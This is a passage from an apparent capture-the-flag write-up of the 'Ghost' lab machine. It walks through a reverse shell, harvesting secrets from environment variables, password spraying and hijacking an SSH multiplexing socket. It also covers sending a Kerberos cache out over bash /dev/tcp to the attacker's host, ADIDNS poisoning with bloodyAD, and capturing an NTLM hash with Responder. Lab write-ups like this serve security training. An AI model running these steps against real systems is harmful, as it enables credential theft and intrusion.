SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001

listening on [any] 8001 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.231.105] 49780
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@36b733906694:/app#</span></mark></span><span class="SemanticString"><span> id

uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78077ae66f09b84bd43ef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f7804fa6c5c2a5b12ed668" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Container Enumeration:</strong></span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7804480f0f8633416e81d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@36b733906694:/app#</span></mark></span><span class="SemanticString"><span> env

DATABASE_URL=./database.sqlite
HOSTNAME=36b733906694
PWD=/app
HOME=/root
CARGO_HOME=/usr/local/cargo
LDAP_BIND_DN=CN=Intranet Principal,CN=Users,DC=ghost,DC=htb
LDAP_HOST=ldap://windows-host:389
LDAP_BIND_PASSWORD=He!KA9oKVT3rL99j
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
RUSTUP_HOME=/usr/local/rustup
ROCKET_ADDRESS=0.0.0.0
SHLVL=4
RUST_VERSION=1.79.0
LC_CTYPE=C.UTF-8
PATH=/usr/local/cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
JWT_SECRET=*xopkAGbLyg9bK_A
_=/usr/bin/env</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78095bd67e381d8213ea7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">An LDAP password is found stored as environment variables. It matched for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">intranet_principal</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7807bb1e3ddca8cf4b5ab" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> netexec ldap 10.129.231.105 -u users.txt -p &#x27;He!KA9oKVT3rL99j&#x27; --continue-on-success

SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\kathryn.holland:He!KA9oKVT3rL99j 
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\cassandra.shelton:He!KA9oKVT3rL99j 
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\robert.steeves:He!KA9oKVT3rL99j 
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\florence.ramirez:He!KA9oKVT3rL99j 
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\justin.bradley:He!KA9oKVT3rL99j 
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\arthur.boyd:He!KA9oKVT3rL99j 
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\beth.clark:He!KA9oKVT3rL99j 
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\charles.gray:He!KA9oKVT3rL99j 
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\jason.taylor:He!KA9oKVT3rL99j 
LDAP        10.129.231.105  389    DC01             </span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>[+] ghost.htb\intranet_principal:He!KA9oKVT3rL99j </span></mark></span><span class="SemanticString"><span>
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\gitea_temp_principal:He!KA9oKVT3rL99j 
LDAP        10.129.231.105  389    DC01             [-] ghost.htb\kristen.rose:He!KA9oKVT3rL99j</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780049a34dad80f3a8b8e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I doubt the user have access to WinRM, but it can still be used for collecting domain information with BloodHound. I’ll revisit the findings once a proper foothold in the domain is established.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78049aeb1ea8fb0e4685c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A Docker script is found in the root directory:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780f8afb5e4dcdb82c82c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@36b733906694:/#</span></mark></span><span class="SemanticString"><span> ls -la

total 84
drwxr-xr-x   1 root root 4096 Jul 22 17:03 .
drwxr-xr-x   1 root root 4096 Jul 22 17:03 ..
-rwxr-xr-x   1 root root    0 Jul 22 17:03 .dockerenv
drwxr-xr-x   1 root root 4096 Jul  5  2024 app
lrwxrwxrwx   1 root root    7 Jul  1  2024 bin -&gt; usr/bin
drwxr-xr-x   2 root root 4096 Mar 29  2024 boot
drwxr-xr-x   5 root root  340 Jan 14 07:40 dev
-rwxr-xr-x   1 root root  215 Jul 22 17:02 docker-entrypoint.sh
drwxr-xr-x   1 root root 4096 Jul 22 17:03 etc
drwxr-xr-x   2 root root 4096 Mar 29  2024 home
lrwxrwxrwx   1 root root    7 Jul  1  2024 lib -&gt; usr/lib
lrwxrwxrwx   1 root root    9 Jul  1  2024 lib64 -&gt; usr/lib64
drwxr-xr-x   2 root root 4096 Jul  1  2024 media
drwxr-xr-x   2 root root 4096 Jul  1  2024 mnt
drwxr-xr-x   2 root root 4096 Jul  1  2024 opt
dr-xr-xr-x 196 root root    0 Jan 14 07:40 proc
drwx------   1 root root 4096 Jul  5  2024 root
drwxr-xr-x   1 root root 4096 Jul  5  2024 run
lrwxrwxrwx   1 root root    8 Jul  1  2024 sbin -&gt; usr/sbin
drwxr-xr-x   2 root root 4096 Jul  1  2024 srv
dr-xr-xr-x  13 root root    0 Jan 14 07:40 sys
drwxrwxrwt   1 root root 4096 Jul  5  2024 tmp
drwxr-xr-x   1 root root 4096 Jul  1  2024 usr
drwxr-xr-x   1 root root 4096 Jul  1  2024 var</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78012a332face16845bff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">docker-entrypoing.sh</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780189e65d11b8936907d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>

<span class="token function">mkdir</span> /root/.ssh
<span class="token function">mkdir</span> /root/.ssh/controlmaster
<span class="token builtin class-name">printf</span> <span class="token string">'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes'</span> <span class="token operator">></span> /root/.ssh/config

<span class="token builtin class-name">exec</span> /app/ghost_intranet</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7808ca696e0d4cdf8ff65" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">No secrets are found in it, but there’s a line relating to SSH that I don’t quite understand.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78035b1e4de0b622a8dae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f7804199e8f1f516d90c7e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SSH Multiplexing:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780899bbfda9ccdf2cb33" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I threw the command to ChatGPT and it gave a pretty good explanation of what’s happening.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780118f49d9f2e7d520f8" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/chatgpt_multiiplex.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/chatgpt_multiiplex.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780a99e4cdf3fe83e63a2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The command modifies the SSH config file to enable </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing">multiplexing</a></span><span class="SemanticString">, a feature that allows multiple SSH sessions to share a single connection to a server. This significantly speeds up repeated connections by avoiding the overhead of re-authentication and connection setup, and is especially useful in automation and scripting.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f78072ac99e6927139554b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@36b733906694:~#</span></mark></span><span class="SemanticString"><span> cat .ssh/config

Host *
  ControlMaster auto
  ControlPath ~/.ssh/controlmaster/%r@%h:%p
  ControlPersist yes</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780509acbef08ee9e6012" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Once the master connection is established, it will be persisted through a socket file specified by the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ControlPath</code></span><span class="SemanticString"> setting. In </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.ssh/controlmaster</code></span><span class="SemanticString">, there’s already an existing connection to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dev-workstation</code></span><span class="SemanticString"> as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">florence.ramirez@ghost.htb</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780299991c385d36b4d36" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@36b733906694:~/.ssh#</span></mark></span><span class="SemanticString"><span> ls -la controlmaster

total 12
drwxr-xr-x 1 root root 4096 Mar 29 09:47 .
drwxr-xr-x 1 root root 4096 Jul  5  2024 ..
srw------- 1 root root    0 Mar 29 09:47 florence.ramirez@ghost.htb@dev-workstation:22</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780678f6ecd6ec69d5ba4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As shown by </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://oooops.dev/2021/01/31/ssh-multiplexing-and-master-mode/">this blog post</a></span><span class="SemanticString">, the connection can be reused by specifying the socket file in the SSH command.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7805ca456dc1d8cf15686" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@36b733906694:~/.ssh/controlmaster#</span></mark></span><span class="SemanticString"><span> ssh -S florence.ramirez@ghost.htb@dev-workstation:22 ghost.htb

Last login: Thu Feb  1 23:58:45 2024 from 172.18.0.1
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>florence.ramirez@LINUX-DEV-WS01:~$</span></mark></span><span class="SemanticString"><span> id

uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78051b4b0d57bf7582512" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">No authentication was required, and it logged me in to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">LINUX-DEV-WS01</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78019a357ee3c15a6ddec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f78072acddeb90cfbdfe26" class="Divider"></div><h3 id="https://www.notion.so/1fe0b98a88f7807f880fd85c6be4d65f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1fe0b98a88f7807f880fd85c6be4d65f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">LINUX-DEV-WS01\florence.ramirez</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1fe0b98a88f7802a948ce2da165aa125" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Kerberos Cache:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78054a704e7c83a1f50f9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A Kerberos cache file is found in the environment variables:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7806684d0eb820657141f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>florence.ramirez@LINUX-DEV-WS01:/$</span></mark></span><span class="SemanticString"><span> env

SHELL=/bin/bash
PWD=/
KRB5CCNAME=FILE:/tmp/krb5cc_50
LOGNAME=florence.ramirez
MOTD_SHOWN=pam
HOME=/home/GHOST/florence.ramirez
SSH_CONNECTION=172.18.0.3 52500 172.18.0.2 22
USER=florence.ramirez
SHLVL=1
LC_CTYPE=C.UTF-8
SSH_CLIENT=172.18.0.3 52500 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
SSH_TTY=/dev/pts/0
_=/usr/bin/env
OLDPWD=/home/GHOST/florence.ramirez</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780549b54f52d45527c04" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Copying the file is a little bit tricky, as the host is even more restricted than the Docker container. Many common tools like </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> or </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">python</code></span><span class="SemanticString"> are not available. I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bash</code></span><span class="SemanticString">&#x27;s built-in TCP socket instead.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780669fafd97e96deb084" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> nc -lvnp 8001 &gt; krb5cc_50

listening on [any] 8001 ...</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7801e84e6ce976e5d93a4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7803ea44ade0c3777af3b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>florence.ramirez@LINUX-DEV-WS01:/$</span></mark></span><span class="SemanticString"><span> cat /tmp/krb5cc_50 &gt; /dev/tcp/10.10.14.93/8001</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78040af67e84dd536599f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the cache file, I can access the domain as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">florence.ramirez</code></span><span class="SemanticString">, but no WinRM access.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780108e10cc147df0816d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> netexec smb 10.129.231.105 -u florence.ramirez -k --use-kcache --shares

SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.105  445    DC01             [+] ghost.htb\florence.ramirez from ccache 
SMB         10.129.231.105  445    DC01             [*] Enumerated shares
SMB         10.129.231.105  445    DC01             Share           Permissions     Remark
SMB         10.129.231.105  445    DC01             -----           -----------     ------
SMB         10.129.231.105  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.231.105  445    DC01             C$                              Default share
SMB         10.129.231.105  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.231.105  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.231.105  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.231.105  445    DC01             Users           READ</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780d9a563cefa76e79a8d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f78081a332f5853e402d80" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">BloodHound:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780649e87c6c56f05e3d2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">florence.ramirez</code></span><span class="SemanticString"> is a member of the IT group, though it’s unclear what access it gives. Other than that, the user doesn’t seem have any useful privileges or outbound controls.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78077b01bfbfec52d7e50" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_florence_groups.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_florence_groups.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7801294c4ef3eeb7f4150" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looking at other users, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">justin.bradley</code></span><span class="SemanticString"> is in the Remote Management User group, and has an outbound control </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ReadGMSAPassword</code></span><span class="SemanticString"> on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ADFS_GMSA$</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780a0b9bdf7abe96a9d0d" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_justin_readgmsa.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_justin_readgmsa.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f78015af16d99e70db2048" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">He can also PSRemote on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DC01</code></span><span class="SemanticString">. Interestingly this AD environment contains 2 domains: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ghost.htb</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">corp.ghost.htb</code></span><span class="SemanticString">. I’ll revisit this later.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78066b047e7e5cc97832d" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_justin_psremote.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_justin_psremote.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780458b28f7fc5ee76ee5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://bloodhound.specterops.io/resources/edges/can-ps-remote">BloodHound</a></span><span class="SemanticString">:</span></span></p></div><blockquote id="https://www.notion.so/1fe0b98a88f780a1b2b4e893939ee457" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system. However, this edge does not guarantee privilege escalation.</span></span></blockquote><div id="https://www.notion.so/1fe0b98a88f780d38bfef515abdda044" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Basically it means the user can run code on the domain controller in the context of itself, which is not really helpful. However, it reminds me of a forum post on Intranet:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780ddb67bf494feeca56c" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_bitbucket.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_bitbucket.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780008b48cd4f88578b8a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Justin was complaining that his script was failing when trying to connect to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bitbucket.ghost.htb</code></span><span class="SemanticString">. This is because the DNS entry has not been configured yet, and Kathryn suggested him to continue running the script as she’ll configure it very soon.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78099a11ec34e1915ab84" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f78021a148cb96c7c7fa47" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">ADIDNS Poisoning:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780b4b4bccac591ae7703" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Given that Justin keeps attempting to run his script, if I can somehow add a DNS entry for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bitbucket.ghost.htb</code></span><span class="SemanticString"> pointing to my host, it would be possible to perform an </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing">ADIDNS poisoning</a></span><span class="SemanticString"> attack and intercept the traffic coming from his script, potentially also obtaining his NTLM hash.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780298885f7a6eb438224" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">By default, any domain users can create DNS entries that don’t already exist. As </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">florence.ramirez</code></span><span class="SemanticString">, I’m able to add the DNS entry using </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780a29e4de2ea105b82cc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> bloodyAD --host dc01.ghost.htb -d ghost.htb -k add dnsRecord bitbucket 10.10.14.93

[+] bitbucket has been successfully added</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7806db416ed52f29f4bcf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll also set up </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/SpiderLabs/Responder">Responder</a></span><span class="SemanticString"> to listen for any incoming traffic, and after a minute or two Justin’s NTLM hash was captured.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f78046a13cc4457b6ae682" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


&lt;..SNIP..&gt;



[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.129.231.105
[HTTP] NTLMv2 Username : ghost\justin.bradley
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:fdf22ff8bdd82451:EE0761D82F8292&lt;..SNIP..&gt;</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7804584f2d6e44397a318" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The hash is easily cracked by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780e6a339e1fdd4ccb96d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> john --wordlist=/usr/share/wordlists/rockyou.txt justin.bradley.hash 

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
